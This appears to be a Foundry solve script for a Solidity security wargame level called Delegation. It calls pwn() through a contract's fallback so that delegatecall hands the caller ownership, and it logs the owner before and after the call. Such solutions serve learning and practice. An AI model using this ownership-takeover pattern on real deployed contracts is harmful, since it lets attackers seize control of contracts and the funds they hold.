// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";


contract DelegationSolve is Script{
    Delegation public delegation = Delegation(0xFb9BeF4E9A8d68C2Bc2c4D2dE5688fbe0e8224F2);
    function run() external{
        vm.startBroadcast();
        console.log("Initial Owner : ", delegation.owner());
        
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("Final Owner : ", delegation.owner());
        
        vm.stopBroadcast();
    }
}

